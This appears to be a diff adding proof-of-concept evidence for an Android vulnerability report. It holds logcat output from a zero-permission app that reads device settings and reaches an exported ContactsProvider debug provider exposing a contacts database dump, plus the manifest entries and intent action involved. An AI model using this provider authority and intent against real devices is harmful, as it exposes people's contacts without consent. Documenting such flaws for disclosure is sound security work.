@@ -1,0 +1,73 @@
+=== ContactsProvider Debug Code Exposure PoC Evidence ===
+Date: Fri Sep 11 23:22:01 IST 2026
+Device: Pixel Watch 2 (3A101RTJWRGCV9) / Android 17 / Build CP2A.260603.001
+
+=== PoC App Logcat Output (UID 10184, ZERO permissions) ===
+--------- beginning of main
+09-11 23:20:37.194 19060 19060 I ContactsDumpExploit: === Zero-Permission Settings Write + Sensitive Data Probe ===
+09-11 23:20:37.194 19060 19060 I ContactsDumpExploit: UID: 10184
+09-11 23:20:37.194 19060 19060 I ContactsDumpExploit: 
+09-11 23:20:37.194 19060 19060 I ContactsDumpExploit: === Settings WRITE Tests ===
+09-11 23:20:37.196 19060 19060 I ContactsDumpExploit: [WRITE] Settings.Global: SecurityException: Permission denial, must have one of: [android.permission.WRITE_SECURE_SETTINGS]
+09-11 23:20:37.198 19060 19060 I ContactsDumpExploit: [WRITE] Settings.Secure: SecurityException: Permission denial, must have one of: [android.permission.WRITE_SECURE_SETTINGS]
+09-11 23:20:37.200 19060 19060 I ContactsDumpExploit: [WRITE] Settings.System: SecurityException: com.poc.contactsdump was not granted  this permission: android.permission.WRITE_SETTINGS.
+09-11 23:20:37.202 19060 19060 I ContactsDumpExploit: [INSERT] Settings.Global: SecurityException
+09-11 23:20:37.202 19060 19060 I ContactsDumpExploit: 
+09-11 23:20:37.202 19060 19060 I ContactsDumpExploit: === Sensitive Settings Dump ===
+09-11 23:20:37.205 19060 19060 I ContactsDumpExploit:   Global.adb_enabled = 1
+09-11 23:20:37.207 19060 19060 I ContactsDumpExploit:   Global.adb_wifi_enabled = 0
+09-11 23:20:37.209 19060 19060 I ContactsDumpExploit:   Global.development_settings_enabled = 1
+09-11 23:20:37.211 19060 19060 I ContactsDumpExploit:   Global.device_name = Google Pixel Watch 2
+09-11 23:20:37.212 19060 19060 I ContactsDumpExploit:   Global.wifi_on = 1
+09-11 23:20:37.214 19060 19060 I ContactsDumpExploit:   Global.bluetooth_on = 1
+09-11 23:20:37.215 19060 19060 I ContactsDumpExploit:   Global.airplane_mode_on = 0
+09-11 23:20:37.219 19060 19060 I ContactsDumpExploit:   Global.stay_on_while_plugged_in = 15
+09-11 23:20:37.221 19060 19060 I ContactsDumpExploit:   Global.wifi_networks_available_notification_on = 0
+09-11 23:20:37.222 19060 19060 I ContactsDumpExploit:   Global.install_non_market_apps = 1
+09-11 23:20:37.226 19060 19060 I ContactsDumpExploit:   Secure.android_id = 8a1d5216dc5aad6b
+09-11 23:20:37.230 19060 19060 I ContactsDumpExploit:   Secure.lock_pattern_autolock BLOCKED
+09-11 23:20:37.233 19060 19060 I ContactsDumpExploit:   Secure.location_mode = 0
+09-11 23:20:37.236 19060 19060 I ContactsDumpExploit:   Secure.default_input_method = com.google.android.inputmethod.latin/com.android.inputmethod.latin.LatinIME
+09-11 23:20:37.238 19060 19060 I ContactsDumpExploit:   Secure.enabled_notification_listeners = com.google.wear.services/com.google.wear.services.notification.stream.listener.NotificationCollectorService:com.google.android.wearable.pixel.pdms/com.google.android.wearable.pixel.pdms.modesync.PdmsNotificationService:com.google.android.wearable.media.sessions/com.google.android.clockwork.media.sessionlistener.MediaNotificationListenerService
+09-11 23:20:37.240 19060 19060 I ContactsDumpExploit:   Secure.user_setup_complete = 1
+09-11 23:20:37.241 19060 19060 I ContactsDumpExploit:   Secure.lock_screen_show_notifications = 1
+09-11 23:20:37.242 19060 19060 I ContactsDumpExploit: 
+09-11 23:20:37.242 19060 19060 I ContactsDumpExploit: === DumpFileProvider Access Proof ===
+09-11 23:20:37.277 19060 19060 I ContactsDumpExploit: [CONFIRMED] DumpFileProvider accessible: 1 rows
+09-11 23:20:37.278 19060 19060 I ContactsDumpExploit:   _display_name = aaaa0000bbbb1111cccc2222dddd3333eeee4444ffff5555aaaa6666bbbb7777-contacts-db.zip
+09-11 23:20:37.278 19060 19060 I ContactsDumpExploit:   _size = null
+09-11 23:20:37.279 19060 19060 I ContactsDumpExploit: 
+09-11 23:20:37.279 19060 19060 I ContactsDumpExploit: === AccountManager Access Test ===
+09-11 23:20:37.281 19060 19060 I ContactsDumpExploit: Total accounts: 0
+09-11 23:20:37.283 19060 19060 I ContactsDumpExploit: Google accounts: 0
+09-11 23:20:37.283 19060 19060 I ContactsDumpExploit: 
+09-11 23:20:37.283 19060 19060 I ContactsDumpExploit: === Other Provider Tests ===
+09-11 23:20:37.309 19060 19060 I ContactsDumpExploit: [ACCESS] GoogleSettings: 6 rows
+09-11 23:20:37.309 19060 19060 I ContactsDumpExploit:   name=client_id
+09-11 23:20:37.309 19060 19060 I ContactsDumpExploit:   _id=1
+09-11 23:20:37.309 19060 19060 I ContactsDumpExploit:   value=android-google
+
+=== Manifest Proof: DumpFileProvider exported, NO permissions ===
+From aapt dump of /system/priv-app/ContactsProvider/ContactsProvider.apk:
+  <provider android:name=".debug.DumpFileProvider" android:exported="true"
+    android:authorities="com.android.contacts.dumpfile"/>
+
+  <activity android:name=".debug.ContactsDumpActivity" android:exported="true">
+    <intent-filter>
+      <action android:name="com.android.providers.contacts.DUMP_DATABASE"/>
+      <category android:name="android.intent.category.DEFAULT"/>
+    </intent-filter>
+  </activity>
+
+=== Dynamic Proof: Provider responds from zero-perm app ===
+09-11 23:20:37.242 19060 19060 I ContactsDumpExploit: === DumpFileProvider Access Proof ===
+09-11 23:20:37.277 19060 19060 I ContactsDumpExploit: [CONFIRMED] DumpFileProvider accessible: 1 rows
+09-11 23:20:37.278 19060 19060 I ContactsDumpExploit:   _display_name = aaaa0000bbbb1111cccc2222dddd3333eeee4444ffff5555aaaa6666bbbb7777-contacts-db.zip
+09-11 23:20:37.278 19060 19060 I ContactsDumpExploit:   _size = null
+
+=== Dynamic Proof: Activity launches from zero-perm app ===
+Starting: Intent { act=com.android.providers.contacts.DUMP_DATABASE }
+Warning: Activity not started, intent has been delivered to currently running top-most instance.
+
+=== PoC App Info (confirming zero permissions) ===
+    versionCode=1 minSdk=34 targetSdk=35
